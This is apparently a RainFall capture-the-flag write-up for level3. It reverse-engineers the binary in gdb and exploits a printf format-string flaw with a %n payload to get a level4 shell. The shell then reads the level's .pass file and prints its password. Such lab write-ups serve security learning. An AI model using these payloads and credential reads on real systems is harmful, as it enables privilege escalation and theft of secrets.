
# Preparations

Entering level3 home directory we see a level3 binary with sticky bit in access rights.
By objdumping the binary we see 2 functions: main and v:

	level3@RainFall:~$ objdump -D -M intel-mnemonic level3 > /tmp/dump

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
	Dump of assembler code for function main:
	   0x0804851a <+0>:	push   %ebp
	   0x0804851b <+1>:	mov    %esp,%ebp
	   0x0804851d <+3>:	and    $0xfffffff0,%esp
	   0x08048520 <+6>:	call   0x80484a4 <v>
	   0x08048525 <+11>:	leave
	   0x08048526 <+12>:	re

The only action after prologue is a call of the v function.
So main will look like:

	int main(void)
	{
		v();
	}

Let's look in the v function:

	(gdb) disass v
	Dump of assembler code for function v:
	   0x080484a4 <+0>:	push   ebp
	   0x080484a5 <+1>:	mov    ebp,esp
	   0x080484a7 <+3>:	sub    esp,0x218
	   0x080484ad <+9>:	mov    eax,ds:0x8049860			;as last times we start to upload some FILE stream
	   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax		;argument for fgets, fourth
	   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200	;argument for fgets, third
	   0x080484be <+26>:	lea    eax,[ebp-0x208]			;argument for fgets, second
	   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax		;argument for fgets, first
	   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>		; call fgets with arguments placed on stack
	   0x080484cc <+40>:	lea    eax,[ebp-0x208]			;argument for printf
	   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax		;argument for printf, first
	   0x080484d5 <+49>:	call   0x8048390 <printf@plt>		; call printf with arguments placed on stack
	   0x080484da <+54>:	mov    eax,ds:0x804988c			;something new, finally it occured to be a global variable
	   0x080484df <+59>:	cmp    eax,0x40				;comparison to 64, global must be a number
	   0x080484e2 <+62>:	jne    0x8048518 <v+116>		;if global is not equal 64 we leave
	   0x080484e4 <+64>:	mov    eax,ds:0x8049880			;as last times we start to upload some FILE stream
	   0x080484e9 <+69>:	mov    edx,eax				;getting ready to fwrite call
	   0x080484eb <+71>:	mov    eax,0x8048600			;getting ready to fwrite call
	   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx		;argument for fwrite, fourth
	   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc		;argument for fwrite, third
	   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1		;argument for fwrite, second
	   0x08048504 <+96>:	mov    DWORD PTR [esp],eax		;argument for fwrite, first
	   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt> 		;call fwrite
	   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d	;preparation to system
	   0x08048513 <+111>:	call   0x80483c0 <system@plt>		;call system
	   0x08048518 <+116>:	leave
	   0x08048519 <+117>:	ret

Let's see some insites by their addresses:

	(gdb) x/s 0x804988c
		0x804988c <m>:	 ""
	(gdb) print *0x804988c
		$4 = 0

This variable (global one) equals zero that means that it is static (in C all the static variables are 0 by declaration):

	(gdb) x/s 0x8049860
		0x8049860 <stdin@@GLIBC_2.0>:	 "\300", <incomplete sequence \375\267>
	(gdb) x/s 0x8049880
		0x8049880 <stdout@@GLIBC_2.0>:	 " ", <incomplete sequence \375\267>
	(gdb) x/s 0x8048600
		0x8048600:	 "Wait what?!\n"
	(gdb) x/s 0x804860d
		0x804860d:	 "/bin/sh"

All the strings and FILE streams are known now.\
We also need to get the buffer size that is sent to first `fgets` function. We look at the stack + make tests:

	(gdb) x/150x $esp
		a lot of addresses and return addresses:
		0xbffff6d0:	0xb7fed280	0x00000000	0xbffff6e8	0x08048525

It is impossible to overwrite buffer this time because fgets takes definite number of symbols from stdin and all the other leaves there. From the address of the last found letter we substract the beginning of the buffer and get 511 byte + \0 = 512 byte.

	(gdb) p 0xbffff6cf - 0xbffff4d0
		$19 = 511

Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.\

# Exploitation

We can use shell under level4 user if global variable is equal 64. Global variable lies in bss under address:

	level3@RainFall:~$ objdump -t ./level3
		0804988c g     O .bss	00000004              m

Or \x8c\x98\x04\x08 in little-endian.\
On this level we deal with format string exploits in `printf(buffer)`. It was difficult for understanding.\

String for `printf` lies on the stack and with the help of format string we can look at the stack without gdb:

	level3@RainFall:~$ ./level3
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 00000200 b7fd1ac0 b7ff37d0 **41414141** 41414141 41414141 41414141 41414141 41414141 41414141 41414141

Where our AAA string starts from the **fourth** `printf` argument. Let's try to rewrite address:

	level3@RainFall:~$ python -c "print('AAAA' + '\x8c\x98\x04\x08' + 'BBBB' + '%x ' * 120)" > /tmp/1lev3

	Starting program: /home/user/level3/level3 < /tmp/1lev3
	Breakpoint 4, 0x080484c7 in v ()
	(gdb) x/30wx $esp
		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
		0xbffff4f0:	0x00000000	0xb7e2b900	0x00000001	0xb7fef305
		0xbffff500:	0xbffff558	0xb7fde2d4	0xb7fde334	0x00000007

	(gdb) c
		Continuing.

	Breakpoint 1, 0x080484cc in v ()
	(gdb) x/30wx $esp
		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
		0xbffff4f0:	0x41414141	**0x0804988c**	0x42424242	0x25207825
		0xbffff500:	0x78252078	0x20782520	0x25207825	0x78252078

All the other 0x25207825 are ‘%x %’ strings. So we can rewrite address of the global variable to the buffer. And then in order to change value of the variable we need to use %n: 

> There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice.

So before %n we need to have 64 bytes in the string.

	% python -c 'print "\x8c\x98\x04\x08" + "%10u" * 3 + "JUNK" * 7 + "AA" + "%n"' > /tmp/3lev3

Where functionally:

	- \x8c\x98\x04\x08 - address of the global variable
	- "%10u" * 3 - alignment of stack so that we "pointer" to the 4th argument in printf (beginning of buffer on stack)
	- "JUNK" * 7 + "AA" - bytes to have 64 bytes before %n
	- "%n" that rewrites value of the variable under address that lies in the beginning of the buffer

Where bytes number:

	- \x8c\x98\x04\x08 - 4 bytes
	- "%10u" * 3 - 30 bytes (30 spaces, we do not print anything with this printf so there will be only spaces)
	- "JUNK" * 7 + "AA" - 30 bytes

That equals 64 bytes.

	Breakpoint 1, 0x080484cc in v ()
	(gdb) x/30wx $esp
		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
		0xbffff4f0:	**0x0804988c**	*0x75303125*	*0x75303125*	*0x75303125*
		0xbffff500:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff510:	0x41414141	0x41414141	0x41414141	0x6e254141

It is very difficult to understand it if you do not play with the line and look on gdb.

# Result

	level3@RainFall:~$ cat /tmp/3lev3 - | ./level3
	�       51230868179843086956496JUNKJUNKJUNKJUNKJUNKJUNKJUNKAA
	Wait what?!
	whoami
	level4
	cat /home/user/level4/.pass
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
	^C

Why do we use `cat -` command? Because even if we break the level and call shell, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.